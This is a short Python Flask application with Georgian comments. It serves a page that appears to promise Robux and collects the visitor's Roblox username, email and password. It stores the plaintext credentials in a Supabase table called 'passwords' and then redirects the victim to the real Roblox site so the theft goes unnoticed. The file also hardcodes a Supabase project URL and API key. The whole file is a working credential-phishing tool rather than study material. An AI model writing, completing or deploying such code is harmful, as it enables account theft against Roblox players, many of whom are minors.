from flask import Flask, render_template, request, redirect
import os
from supabase import create_client, Client

app = Flask(__name__)

# ⚠️ ეს ორი ხაზი შეავსე Supabase-დან აღებული მონაცემებით ⚠️
SUPABASE_URL = "https://buqmhyvcxakfkjcgkxbt.supabase.c0"
SUPABASE_KEY = "sb_publishable_aBu2Sj2ZEp_Q2RZ5H7G63A_Ed460CwV"
# ვუკავშირდებით ბაზას
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        service = request.form.get('service', 'Roblox')
        robux_amount = request.form.get('robux_amount', 'Unknown')
        username = request.form.get('username', '')
        email = request.form.get('email', '')
        password = request.form.get('password', '')

        # ვწერთ მონაცემებს Supabase-ის ბაზაში
        try:
            supabase.table('passwords').insert({
                "service": service,
                "robux_requested": robux_amount,
                "username": username,
                "email": email,
                "password": password
            }).execute()
        except Exception as e:
            print(f"ბაზაში ჩაწერის შეცდომა: {e}")

        # მომხმარებელს ისევ რობლოქსზე გადავიყვანთ
        return redirect('https://www.roblox.com')

    return render_template('index.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
